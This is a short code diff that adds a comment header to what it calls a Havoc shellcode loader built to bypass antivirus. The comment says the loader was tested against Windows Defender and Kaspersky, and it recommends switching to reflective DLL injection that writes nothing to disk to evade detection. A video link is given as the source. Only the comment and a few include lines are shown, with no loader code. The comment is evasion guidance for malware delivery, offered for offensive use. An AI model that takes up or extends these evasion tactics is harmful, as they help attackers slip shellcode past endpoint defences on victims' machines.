@@ -1,3 +1,11 @@
+/*havoc shell code loader to bypass AV 
+this shellcode loader tast on Windows Defender and KasperSky
+to bypass kaspersky you must change your Porcess Injection Process
+the Process Injection has been Detected by the KasperSky so You Must Change your strategy like using DLL To bypass kasperSKY 
+like using Reflective DLL injection without Write AnyThing on the Disk
+Reflective DLL Injection Source : https://www.youtube.com/watch?v=teWLAUxGmTg
+*/
+
 #include <iostream>
 #include <fstream>
 #include <vector>
